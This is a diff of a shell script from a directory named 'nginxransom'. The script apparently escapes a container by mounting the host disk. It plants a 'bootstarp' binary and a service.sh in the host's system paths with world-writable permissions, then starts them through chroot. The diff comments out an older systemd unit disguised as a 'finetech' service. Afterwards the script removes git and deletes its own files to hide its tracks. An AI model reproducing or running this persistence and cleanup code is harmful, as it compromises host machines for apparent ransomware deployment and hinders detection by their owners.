@@ -11,16 +11,22 @@ diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{pri
 mount $diskpart /mnt/
 cp   nginxransom/bootstarp.txt /mnt/usr/bin/bootstarp
 cp   nginxransom/bootstarp.txt /mnt/usr/local/bin/bootstarp 
-cp   nginxransom/bootstarp.txt /usr/bin/bootstarp 
+cp   nginxransom/bootstarp.txt /usr/bin/bootstarp
+cp   nginxransom/service.sh ../
+cp   nginxransom/service.sh ../mnt/
 chmod 777 /usr/bin/bootstarp 
 chmod 777 mnt/usr/local/bin/bootstarp
 chmod 777 mnt/usr/bin/bootstarp 
+chmod 777 mnt/service.sh
+chmod 777 service.sh
+chroot mnt/ ./service.sh start
+#chroot mnt/ update-rc.d $fintech defaults
 #chroot ./ ./bootstarp 
-echo  "[Unit]\nDescription=finetech\nAfter=network.target\n\n[Service]\nExecStart=/usr/local/bin/bootstarp\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > mnt/usr/lib/systemd/system/finetech.service
-chmod 777  mnt/usr/lib/systemd/system/finetech.service
-chroot mnt/ systemctl daemon-reload
-wait
-chroot mnt/ systemctl enable finetech.service
-chroot mnt/ systemctl start finetech.service
+#echo  "[Unit]\nDescription=finetech\nAfter=network.target\n\n[Service]\nExecStart=/usr/local/bin/bootstarp\nRestart=always\n\n[Install]\nWantedBy=multi-user.target" > mnt/usr/lib/systemd/system/finetech.service
+#chmod 777  mnt/usr/lib/systemd/system/finetech.service
+#chroot mnt/ systemctl daemon-reload
+#wait
+#chroot mnt/ systemctl enable finetech.service
+#chroot mnt/ systemctl start finetech.service
 apt remove git -y
 rm -rf nginxransom/
